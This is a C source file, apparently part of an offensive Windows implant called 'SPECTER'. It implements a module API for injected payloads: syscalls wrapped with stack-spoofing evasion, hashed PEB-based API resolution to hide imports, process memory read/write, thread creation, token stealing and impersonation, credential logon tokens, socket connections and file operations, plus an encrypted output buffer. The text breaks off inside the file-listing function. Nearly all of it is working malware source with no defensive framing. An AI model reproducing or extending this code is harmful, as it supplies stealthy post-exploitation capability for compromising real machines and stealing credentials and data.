/**
 * SPECTER Implant — Module Bus API Implementation
 *
 * All module operations route through this bus.  Each API function
 * calls the evasion engine which wraps syscalls with stack spoofing.
 * The output ring buffer uses ChaCha20 encryption at rest.
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"
#include "crypto.h"
#include "bus.h"
#include "peb.h"
#include "sleep.h"

/* ------------------------------------------------------------------ */
/*  Static bus context storage                                         */
/* ------------------------------------------------------------------ */

static BUS_CONTEXT g_bus_ctx;

/* ------------------------------------------------------------------ */
/*  Forward declarations for bus API implementations                   */
/* ------------------------------------------------------------------ */

static PVOID     bus_mem_alloc(SIZE_T size, DWORD perms);
static BOOL      bus_mem_free(PVOID ptr);
static BOOL      bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms);

static HANDLE    bus_net_connect(const char *addr, DWORD port, DWORD proto);
static BOOL      bus_net_send(HANDLE handle, const BYTE *data, DWORD len);
static DWORD     bus_net_recv(HANDLE handle, BYTE *buf, DWORD len);
static BOOL      bus_net_close(HANDLE handle);

static HANDLE    bus_proc_open(DWORD pid, DWORD access);
static BOOL      bus_proc_read(HANDLE handle, PVOID addr, BYTE *buf, DWORD len);
static BOOL      bus_proc_write(HANDLE handle, PVOID addr, const BYTE *data, DWORD len);
static BOOL      bus_proc_close(HANDLE handle);

static HANDLE    bus_thread_create(PVOID func, PVOID param, BOOL suspended);
static BOOL      bus_thread_resume(HANDLE handle);
static BOOL      bus_thread_terminate(HANDLE handle);

static HANDLE    bus_token_steal(DWORD pid);
static BOOL      bus_token_impersonate(HANDLE handle);
static BOOL      bus_token_revert(void);
static HANDLE    bus_token_make(const char *user, const char *pass, const char *domain);

static DWORD     bus_file_read(const char *path, BYTE *buf, DWORD len);
static BOOL      bus_file_write(const char *path, const BYTE *data, DWORD len);
static BOOL      bus_file_delete(const char *path);
static PVOID     bus_file_list(const char *path);

static DWORD     bus_reg_read(DWORD hive, const char *path, const char *value);
static BOOL      bus_reg_write(DWORD hive, const char *path, const char *value,
                               const BYTE *data, DWORD type);
static BOOL      bus_reg_delete(DWORD hive, const char *path, const char *value);

static BOOL      bus_output(const BYTE *data, DWORD len, DWORD type);
static PVOID     bus_resolve(const char *dll_name, const char *func_name);
static void      bus_log(DWORD level, const char *msg);

/* ------------------------------------------------------------------ */
/*  Helper: get evasion context from the bus context                   */
/* ------------------------------------------------------------------ */

static EVASION_CONTEXT *bus_get_evasion(void) {
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (!ctx)
        return NULL;
    return (EVASION_CONTEXT *)ctx->evasion_ctx;
}

/* ------------------------------------------------------------------ */
/*  Output ring buffer — encrypted circular buffer                     */
/* ------------------------------------------------------------------ */

/**
 * Generate a random encryption key for the output ring buffer.
 * Uses RDTSC-based PRNG as entropy source (same pattern as memguard).
 */
static void output_generate_key(OUTPUT_RING *ring) {
    /* RDTSC-based seed for PRNG */
    DWORD seed;
    __asm__ volatile ("rdtsc" : "=a"(seed) : : "edx");

    /* Simple LCG PRNG to fill key and nonce */
    DWORD state = seed;
    for (int i = 0; i < 32; i++) {
        state = state * 1103515245 + 12345;
        ring->enc_key[i] = (BYTE)(state >> 16);
    }
    for (int i = 0; i < 12; i++) {
        state = state * 1103515245 + 12345;
        ring->enc_nonce[i] = (BYTE)(state >> 16);
    }
}

void output_reset(OUTPUT_RING *ring) {
    if (!ring)
        return;
    spec_memset(ring->data, 0, BUS_OUTPUT_RING_SIZE);
    ring->head = 0;
    ring->tail = 0;
    ring->count = 0;
    ring->encrypted = FALSE;
    output_generate_key(ring);
}

DWORD output_available(const OUTPUT_RING *ring) {
    if (!ring)
        return 0;
    return ring->count;
}

/**
 * Output entry header written before each output chunk in the ring.
 * Allows drain to reconstruct individual output messages.
 */
typedef struct _OUTPUT_ENTRY_HDR {
    DWORD len;    /* Payload length */
    DWORD type;   /* OUTPUT_TEXT / OUTPUT_BINARY / OUTPUT_ERROR */
} OUTPUT_ENTRY_HDR;

BOOL output_write(OUTPUT_RING *ring, const BYTE *data, DWORD len, DWORD type) {
    if (!ring || !data || len == 0)
        return FALSE;

    /* Check total size: header + data */
    DWORD total = sizeof(OUTPUT_ENTRY_HDR) + len;
    if (total > BUS_OUTPUT_RING_SIZE - ring->count)
        return FALSE;  /* Not enough space */

    if (len > BUS_OUTPUT_ENTRY_MAX)
        return FALSE;  /* Single entry too large */

    /* Build header */
    OUTPUT_ENTRY_HDR hdr;
    hdr.len = len;
    hdr.type = type;

    /* Encrypt the header + data with ChaCha20 before writing to ring.
     * Use the current head position as the counter to get unique
     * keystream for each write. */
    BYTE enc_buf[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
    BYTE plain_buf[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];

    spec_memcpy(plain_buf, &hdr, sizeof(OUTPUT_ENTRY_HDR));
    spec_memcpy(plain_buf + sizeof(OUTPUT_ENTRY_HDR), data, len);

    spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
                          ring->head / CHACHA20_BLOCK_SIZE,
                          plain_buf, total, enc_buf);

    /* Write encrypted bytes to ring buffer (wrapping) */
    for (DWORD i = 0; i < total; i++) {
        ring->data[(ring->head + i) % BUS_OUTPUT_RING_SIZE] = enc_buf[i];
    }
    ring->head = (ring->head + total) % BUS_OUTPUT_RING_SIZE;
    ring->count += total;
    ring->encrypted = TRUE;

    /* Zero plaintext from stack */
    spec_memset(plain_buf, 0, total);

    return TRUE;
}

DWORD output_drain(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len) {
    if (!ring || !dest || dest_len == 0 || ring->count == 0)
        return 0;

    DWORD drained = 0;

    while (ring->count >= sizeof(OUTPUT_ENTRY_HDR)) {
        /* Read encrypted header from ring */
        BYTE enc_hdr_buf[sizeof(OUTPUT_ENTRY_HDR)];
        for (DWORD i = 0; i < sizeof(OUTPUT_ENTRY_HDR); i++) {
            enc_hdr_buf[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
        }

        /* Decrypt header */
        OUTPUT_ENTRY_HDR hdr;
        spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
                              ring->tail / CHACHA20_BLOCK_SIZE,
                              enc_hdr_buf, sizeof(OUTPUT_ENTRY_HDR),
                              (BYTE *)&hdr);

        DWORD total = sizeof(OUTPUT_ENTRY_HDR) + hdr.len;

        /* Sanity checks */
        if (hdr.len > BUS_OUTPUT_ENTRY_MAX || total > ring->count)
            break;

        /* Check if dest has room for the payload */
        if (drained + hdr.len > dest_len)
            break;

        /* Read full encrypted entry */
        BYTE enc_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
        for (DWORD i = 0; i < total; i++) {
            enc_entry[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
        }

        /* Decrypt full entry */
        BYTE plain_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
        spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
                              ring->tail / CHACHA20_BLOCK_SIZE,
                              enc_entry, total, plain_entry);

        /* Copy payload to dest (skip header) */
        spec_memcpy(dest + drained, plain_entry + sizeof(OUTPUT_ENTRY_HDR), hdr.len);
        drained += hdr.len;

        /* Zero ring region */
        for (DWORD i = 0; i < total; i++) {
            ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE] = 0;
        }

        ring->tail = (ring->tail + total) % BUS_OUTPUT_RING_SIZE;
        ring->count -= total;

        /* Zero plaintext from stack */
        spec_memset(plain_entry, 0, total);
    }

    if (ring->count == 0)
        ring->encrypted = FALSE;

    return drained;
}

/* ------------------------------------------------------------------ */
/*  bus_init — populate function table, init output ring               */
/* ------------------------------------------------------------------ */

NTSTATUS bus_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    spec_memset(&g_bus_ctx, 0, sizeof(BUS_CONTEXT));
    g_bus_ctx.implant_ctx = ctx;

    /* Populate the API function table */
    MODULE_BUS_API *api = &g_bus_ctx.api;

    api->mem_alloc          = bus_mem_alloc;
    api->mem_free           = bus_mem_free;
    api->mem_protect        = bus_mem_protect;

    api->net_connect        = bus_net_connect;
    api->net_send           = bus_net_send;
    api->net_recv           = bus_net_recv;
    api->net_close          = bus_net_close;

    api->proc_open          = bus_proc_open;
    api->proc_read          = bus_proc_read;
    api->proc_write         = bus_proc_write;
    api->proc_close         = bus_proc_close;

    api->thread_create      = bus_thread_create;
    api->thread_resume      = bus_thread_resume;
    api->thread_terminate   = bus_thread_terminate;

    api->token_steal        = bus_token_steal;
    api->token_impersonate  = bus_token_impersonate;
    api->token_revert       = bus_token_revert;
    api->token_make         = bus_token_make;

    api->file_read          = bus_file_read;
    api->file_write         = bus_file_write;
    api->file_delete        = bus_file_delete;
    api->file_list          = bus_file_list;

    api->reg_read           = bus_reg_read;
    api->reg_write          = bus_reg_write;
    api->reg_delete         = bus_reg_delete;

    api->output             = bus_output;
    api->resolve            = bus_resolve;
    api->log                = bus_log;

    /* Initialize the encrypted output ring buffer */
    output_reset(&g_bus_ctx.output_ring);

    /* Store bus context in implant context */
    ctx->module_bus = &g_bus_ctx;
    g_bus_ctx.initialized = TRUE;

    return STATUS_SUCCESS;
}

MODULE_BUS_API *bus_get_api(BUS_CONTEXT *bctx) {
    if (!bctx || !bctx->initialized)
        return NULL;
    return &bctx->api;
}

/* ------------------------------------------------------------------ */
/*  Memory API implementations                                         */
/* ------------------------------------------------------------------ */

static PVOID bus_mem_alloc(SIZE_T size, DWORD perms) {
    PVOID base = NULL;
    SIZE_T alloc_size = size;
    HANDLE process = (HANDLE)-1;  /* NtCurrentProcess */

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTALLOCATEVIRTUALMEMORY,
        process, &base, (ULONG_PTR)0, &alloc_size,
        (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)perms);

    if (!NT_SUCCESS(status))
        return NULL;

    /* Track allocation for sleep-time encryption */
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (ctx && ctx->sleep_ctx)
        sleep_track_alloc((SLEEP_CONTEXT *)ctx->sleep_ctx, base, alloc_size);

    return base;
}

static BOOL bus_mem_free(PVOID ptr) {
    if (!ptr)
        return FALSE;

    /* Untrack from sleep heap list */
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (ctx && ctx->sleep_ctx)
        sleep_untrack_alloc((SLEEP_CONTEXT *)ctx->sleep_ctx, ptr);

    SIZE_T size = 0;
    HANDLE process = (HANDLE)-1;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTFREEVIRTUALMEMORY,
        process, &ptr, &size, (ULONG)MEM_RELEASE);

    return NT_SUCCESS(status);
}

static BOOL bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms) {
    if (!ptr)
        return FALSE;

    ULONG old_protect;
    HANDLE process = (HANDLE)-1;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTPROTECTVIRTUALMEMORY,
        process, &ptr, &size, (ULONG)perms, &old_protect);

    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Network API implementations — PEB-resolved ws2_32.dll               */
/* ------------------------------------------------------------------ */

/* DJB2 hashes for ws2_32 functions used by bus net API */
#define HASH_WSASOCKETA_BUS     0x8E018E3A  /* "WSASocketA"   */
#define HASH_CONNECT_BUS        0xD3764DCF  /* "connect"      */
#define HASH_SEND_BUS           0x7C9DDB4F  /* "send"         */
#define HASH_RECV_BUS           0x7C9D4D95  /* "recv"         */
#define HASH_CLOSESOCKET_BUS    0x494CB104  /* "closesocket"  */
#define HASH_LOGONUSERW         0xE4328B5A  /* "LogonUserW"   */

/* ws2_32.dll and advapi32.dll module hashes (may already be defined
   from comms.h or sleep.h in unity build) */
#ifndef HASH_WS2_32_DLL
#define HASH_WS2_32_DLL         0x9AD10B0F  /* "ws2_32.dll"   */
#endif
#ifndef HASH_ADVAPI32_DLL
#define HASH_ADVAPI32_DLL       0x67208A49  /* "advapi32.dll" */
#endif

/**
 * Resolve ws2_32.dll base via PEB walk, with LoadLibraryA fallback.
 */
static PVOID bus_resolve_ws2(void) {
    PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
    if (ws2) return ws2;

    /* LoadLibraryA fallback */
    typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return NULL;

    fn_LoadLibraryA pLoadLib = (fn_LoadLibraryA)
        find_export_by_hash(k32, 0x0666395B);
    if (!pLoadLib) return NULL;

    char ws2_name[] = {'w','s','2','_','3','2','.','d','l','l',0};
    return pLoadLib(ws2_name);
}

static HANDLE bus_net_connect(const char *addr, DWORD port, DWORD proto) {
    if (!addr)
        return INVALID_HANDLE_VALUE;

    PVOID ws2 = bus_resolve_ws2();
    if (!ws2) return INVALID_HANDLE_VALUE;

    /* Resolve WSASocketA, connect */
    typedef ULONG_PTR (__attribute__((stdcall)) *fn_WSASocketA)(
        int, int, int, PVOID, DWORD, DWORD);
    typedef int (__attribute__((stdcall)) *fn_connect_t)(
        ULONG_PTR, const SOCKADDR *, int);

    fn_WSASocketA pWSASocket = (fn_WSASocketA)
        find_export_by_hash(ws2, HASH_WSASOCKETA_BUS);
    fn_connect_t pConnect = (fn_connect_t)
        find_export_by_hash(ws2, HASH_CONNECT_BUS);

    if (!pWSASocket || !pConnect)
        return INVALID_HANDLE_VALUE;

    /* Determine socket type from proto: 0 = TCP, 1 = UDP */
    int sock_type = (proto == 1) ? 2 : SOCK_STREAM;    /* SOCK_DGRAM = 2 */
    int ip_proto = (proto == 1) ? 17 : IPPROTO_TCP;    /* IPPROTO_UDP = 17 */

    /* Create socket via WSASocketA (no overlapped) */
    ULONG_PTR sock = pWSASocket(AF_INET, sock_type, ip_proto, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
        return INVALID_HANDLE_VALUE;

    /* Build sockaddr_in on stack */
    BYTE sa[16];
    spec_memset(sa, 0, sizeof(sa));
    *(WORD *)sa = AF_INET;                          /* sin_family */
    /* htons: swap bytes of port */
    *(BYTE *)(sa + 2) = (BYTE)(port >> 8);
    *(BYTE *)(sa + 3) = (BYTE)(port & 0xFF);

    /* Parse dotted-decimal IPv4 address manually */
    DWORD ip = 0;
    DWORD octet = 0;
    DWORD shift = 0;
    for (DWORD i = 0; ; i++) {
        if (addr[i] >= '0' && addr[i] <= '9') {
            octet = octet * 10 + (addr[i] - '0');
        } else {
            ip |= (octet & 0xFF) << shift;
            shift += 8;
            octet = 0;
            if (addr[i] == '\0') break;
        }
    }
    *(DWORD *)(sa + 4) = ip;                        /* sin_addr (network order) */

    int ret = pConnect(sock, (const SOCKADDR *)sa, 16);
    if (ret == SOCKET_ERROR) {
        typedef int (__attribute__((stdcall)) *fn_closesocket_t)(ULONG_PTR);
        fn_closesocket_t pClose = (fn_closesocket_t)
            find_export_by_hash(ws2, HASH_CLOSESOCKET_BUS);
        if (pClose) pClose(sock);
        return INVALID_HANDLE_VALUE;
    }

    return (HANDLE)sock;
}

static BOOL bus_net_send(HANDLE handle, const BYTE *data, DWORD len) {
    if (!data || len == 0)
        return FALSE;

    PVOID ws2 = bus_resolve_ws2();
    if (!ws2) return FALSE;

    typedef int (__attribute__((stdcall)) *fn_send_t)(
        ULONG_PTR, const char *, int, int);
    fn_send_t pSend = (fn_send_t)find_export_by_hash(ws2, HASH_SEND_BUS);
    if (!pSend) return FALSE;

    DWORD sent = 0;
    while (sent < len) {
        int n = pSend((ULONG_PTR)handle, (const char *)(data + sent),
                       (int)(len - sent), 0);
        if (n <= 0) return FALSE;
        sent += (DWORD)n;
    }
    return TRUE;
}

static DWORD bus_net_recv(HANDLE handle, BYTE *buf, DWORD len) {
    if (!buf || len == 0)
        return 0;

    PVOID ws2 = bus_resolve_ws2();
    if (!ws2) return 0;

    typedef int (__attribute__((stdcall)) *fn_recv_t)(
        ULONG_PTR, char *, int, int);
    fn_recv_t pRecv = (fn_recv_t)find_export_by_hash(ws2, HASH_RECV_BUS);
    if (!pRecv) return 0;

    int n = pRecv((ULONG_PTR)handle, (char *)buf, (int)len, 0);
    return (n > 0) ? (DWORD)n : 0;
}

static BOOL bus_net_close(HANDLE handle) {
    PVOID ws2 = bus_resolve_ws2();
    if (!ws2) return FALSE;

    typedef int (__attribute__((stdcall)) *fn_closesocket_t)(ULONG_PTR);
    fn_closesocket_t pClose = (fn_closesocket_t)
        find_export_by_hash(ws2, HASH_CLOSESOCKET_BUS);
    if (!pClose) return FALSE;

    return pClose((ULONG_PTR)handle) == 0;
}

/* ------------------------------------------------------------------ */
/*  Process API implementations                                        */
/* ------------------------------------------------------------------ */

static HANDLE bus_proc_open(DWORD pid, DWORD access) {
    HANDLE process = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    spec_memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);
    spec_memset(&cid, 0, sizeof(cid));
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENPROCESS,
        &process, (ULONG)access, &oa, &cid);

    if (!NT_SUCCESS(status))
        return INVALID_HANDLE_VALUE;
    return process;
}

static BOOL bus_proc_read(HANDLE handle, PVOID addr, BYTE *buf, DWORD len) {
    SIZE_T bytes_read = 0;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTREADVIRTUALMEMORY,
        handle, addr, buf, (SIZE_T)len, &bytes_read);

    return NT_SUCCESS(status);
}

static BOOL bus_proc_write(HANDLE handle, PVOID addr, const BYTE *data, DWORD len) {
    SIZE_T bytes_written = 0;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTWRITEVIRTUALMEMORY,
        handle, addr, (PVOID)data, (SIZE_T)len, &bytes_written);

    return NT_SUCCESS(status);
}

static BOOL bus_proc_close(HANDLE handle) {
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCLOSE, handle);
    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Thread API implementations                                         */
/* ------------------------------------------------------------------ */

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED  0x00000001

static HANDLE bus_thread_create(PVOID func, PVOID param, BOOL suspended) {
    HANDLE thread = NULL;
    ULONG flags = suspended ? THREAD_CREATE_FLAGS_CREATE_SUSPENDED : 0;

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATETHREADEX,
        &thread, (ULONG)0x1FFFFF, /* THREAD_ALL_ACCESS */
        NULL,                      /* OBJECT_ATTRIBUTES */
        (HANDLE)-1,                /* NtCurrentProcess  */
        func, param, flags,
        (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);

    if (!NT_SUCCESS(status))
        return INVALID_HANDLE_VALUE;
    return thread;
}

static BOOL bus_thread_resume(HANDLE handle) {
    ULONG prev_count = 0;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTRESUMETHREAD, handle, &prev_count);
    return NT_SUCCESS(status);
}

static BOOL bus_thread_terminate(HANDLE handle) {
    /* Close the thread handle — actual termination via
     * NtTerminateThread would need to be added to syscall table */
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCLOSE, handle);
    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Token API implementations                                          */
/* ------------------------------------------------------------------ */

static HANDLE bus_token_steal(DWORD pid) {
    /* Open target process */
    HANDLE process = bus_proc_open(pid, PROCESS_QUERY_INFORMATION);
    if (process == INVALID_HANDLE_VALUE)
        return INVALID_HANDLE_VALUE;

    /* Open the process token */
    HANDLE token = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENPROCESSTOKEN,
        process, (ULONG)(TOKEN_DUPLICATE | TOKEN_QUERY), &token);

    if (!NT_SUCCESS(status)) {
        bus_proc_close(process);
        return INVALID_HANDLE_VALUE;
    }

    /* Duplicate the token as an impersonation token */
    HANDLE dup_token = NULL;
    OBJECT_ATTRIBUTES oa;
    spec_memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);

    /* SECURITY_QUALITY_OF_SERVICE for impersonation level */
    BYTE sqos[16];
    spec_memset(sqos, 0, sizeof(sqos));
    *(DWORD *)sqos = sizeof(sqos);       /* Length */
    *(DWORD *)(sqos + 4) = 2;            /* SecurityImpersonation level */
    oa.SecurityQualityOfService = sqos;

    status = evasion_syscall(bus_get_evasion(),
        HASH_NTDUPLICATETOKEN,
        token, (ULONG)(TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY),
        &oa, (BOOL)FALSE, (DWORD)TokenImpersonation, &dup_token);

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, token);
    bus_proc_close(process);

    if (!NT_SUCCESS(status))
        return INVALID_HANDLE_VALUE;
    return dup_token;
}

static BOOL bus_token_impersonate(HANDLE handle) {
    HANDLE current_thread = (HANDLE)(ULONG_PTR)-2;  /* NtCurrentThread */
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTSETINFORMATIONTHREAD,
        current_thread, (DWORD)ThreadImpersonationToken,
        &handle, (ULONG)sizeof(HANDLE));
    return NT_SUCCESS(status);
}

static BOOL bus_token_revert(void) {
    HANDLE null_token = NULL;
    HANDLE current_thread = (HANDLE)(ULONG_PTR)-2;  /* NtCurrentThread */
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTSETINFORMATIONTHREAD,
        current_thread, (DWORD)ThreadImpersonationToken,
        &null_token, (ULONG)sizeof(HANDLE));
    return NT_SUCCESS(status);
}

static HANDLE bus_token_make(const char *user, const char *pass, const char *domain) {
    if (!user || !pass)
        return INVALID_HANDLE_VALUE;

    /* Resolve advapi32.dll via PEB walk + LoadLibraryA fallback */
    PVOID advapi = find_module_by_hash(HASH_ADVAPI32_DLL);
    if (!advapi) {
        /* Try loading via LoadLibraryA from kernel32 */
        typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
        PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
        if (!k32) return INVALID_HANDLE_VALUE;

        fn_LoadLibraryA pLoadLib = (fn_LoadLibraryA)
            find_export_by_hash(k32, 0x0666395B);
        if (!pLoadLib) return INVALID_HANDLE_VALUE;

        char adv_name[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
        advapi = pLoadLib(adv_name);
        if (!advapi) return INVALID_HANDLE_VALUE;
    }

    /* Resolve LogonUserW */
    typedef BOOL (__attribute__((stdcall)) *fn_LogonUserW)(
        PWCHAR, PWCHAR, PWCHAR, DWORD, DWORD, HANDLE *);

    fn_LogonUserW pLogonUserW = (fn_LogonUserW)
        find_export_by_hash(advapi, HASH_LOGONUSERW);
    if (!pLogonUserW)
        return INVALID_HANDLE_VALUE;

    /* Convert ANSI strings to wide on stack */
    WCHAR wuser[128];
    WCHAR wpass[128];
    WCHAR wdomain[128];

    DWORD i;
    for (i = 0; user[i] && i < 127; i++)
        wuser[i] = (WCHAR)(unsigned char)user[i];
    wuser[i] = 0;

    for (i = 0; pass[i] && i < 127; i++)
        wpass[i] = (WCHAR)(unsigned char)pass[i];
    wpass[i] = 0;

    if (domain) {
        for (i = 0; domain[i] && i < 127; i++)
            wdomain[i] = (WCHAR)(unsigned char)domain[i];
        wdomain[i] = 0;
    } else {
        wdomain[0] = '.';
        wdomain[1] = 0;
    }

    HANDLE token = NULL;
    /* LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3 */
    BOOL ok = pLogonUserW(wuser, wdomain, wpass, 9, 3, &token);

    /* Zero password from stack */
    spec_memset(wpass, 0, sizeof(wpass));

    if (!ok)
        return INVALID_HANDLE_VALUE;
    return token;
}

/* ------------------------------------------------------------------ */
/*  File API helper: build NT path UNICODE_STRING on caller stack      */
/*  Converts ANSI path to wide \??\C:\... format                       */
/* ------------------------------------------------------------------ */

#define BUS_MAX_PATH_WCHARS 520

/**
 * Build an NT-format UNICODE_STRING from an ANSI path.
 * Prepends \??\ prefix.  Caller provides wbuf of BUS_MAX_PATH_WCHARS.
 * Returns TRUE on success.
 */
static BOOL bus_build_nt_path(const char *path, WCHAR *wbuf,
                               UNICODE_STRING *us) {
    if (!path || !wbuf || !us)
        return FALSE;

    /* Write \??\ prefix */
    wbuf[0] = '\\';
    wbuf[1] = '?';
    wbuf[2] = '?';
    wbuf[3] = '\\';
    DWORD pos = 4;

    /* Convert ANSI to wide */
    for (DWORD i = 0; path[i] != '\0'; i++) {
        if (pos >= BUS_MAX_PATH_WCHARS - 1)
            return FALSE;
        wbuf[pos++] = (WCHAR)(unsigned char)path[i];
    }
    wbuf[pos] = 0;

    us->Buffer = wbuf;
    us->Length = (USHORT)(pos * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((pos + 1) * sizeof(WCHAR));
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  File API implementations                                           */
/* ------------------------------------------------------------------ */

static DWORD bus_file_read(const char *path, BYTE *buf, DWORD len) {
    if (!path || !buf || len == 0)
        return 0;

    WCHAR wpath[BUS_MAX_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_nt_path(path, wpath, &us_path))
        return 0;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE file = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATEFILE,
        &file, (ULONG)(GENERIC_READ | SYNCHRONIZE), &oa, &iosb,
        (PLARGE_INTEGER)NULL, (ULONG)FILE_ATTRIBUTE_NORMAL,
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE),
        (ULONG)FILE_OPEN,
        (ULONG)FILE_SYNCHRONOUS_IO_NONALERT,
        (PVOID)NULL, (ULONG)0);

    if (!NT_SUCCESS(status))
        return 0;

    spec_memset(&iosb, 0, sizeof(iosb));
    status = evasion_syscall(bus_get_evasion(),
        HASH_NTREADFILE,
        file, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
        &iosb, (PVOID)buf, (ULONG)len,
        (PLARGE_INTEGER)NULL, (PULONG)NULL);

    DWORD bytes_read = NT_SUCCESS(status) ? (DWORD)iosb.Information : 0;

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, file);
    return bytes_read;
}

static BOOL bus_file_write(const char *path, const BYTE *data, DWORD len) {
    if (!path || !data || len == 0)
        return FALSE;

    WCHAR wpath[BUS_MAX_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_nt_path(path, wpath, &us_path))
        return FALSE;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE file = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATEFILE,
        &file, (ULONG)(GENERIC_WRITE | SYNCHRONIZE), &oa, &iosb,
        (PLARGE_INTEGER)NULL, (ULONG)FILE_ATTRIBUTE_NORMAL,
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE),
        (ULONG)FILE_OPEN_IF_NTDEFS,
        (ULONG)FILE_SYNCHRONOUS_IO_NONALERT,
        (PVOID)NULL, (ULONG)0);

    if (!NT_SUCCESS(status))
        return FALSE;

    spec_memset(&iosb, 0, sizeof(iosb));
    status = evasion_syscall(bus_get_evasion(),
        HASH_NTWRITEFILE,
        file, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
        &iosb, (PVOID)data, (ULONG)len,
        (PLARGE_INTEGER)NULL, (PULONG)NULL);

    BOOL ok = NT_SUCCESS(status);
    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, file);
    return ok;
}

static BOOL bus_file_delete(const char *path) {
    if (!path)
        return FALSE;

    WCHAR wpath[BUS_MAX_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_nt_path(path, wpath, &us_path))
        return FALSE;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE file = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATEFILE,
        &file, (ULONG)(DELETE_ACCESS | SYNCHRONIZE), &oa, &iosb,
        (PLARGE_INTEGER)NULL, (ULONG)FILE_ATTRIBUTE_NORMAL,
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE),
        (ULONG)FILE_OPEN,
        (ULONG)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE),
        (PVOID)NULL, (ULONG)0);

    if (!NT_SUCCESS(status))
        return FALSE;

    /* Closing the handle with FILE_DELETE_ON_CLOSE triggers deletion */
    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, file);
    return TRUE;
}

static PVOID bus_file_list(const char *path) {
    if (!path)
        return NULL;

    WCHAR wpath[BUS_MAX_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_nt_path(path, wpath, &us_path))
        return NULL;

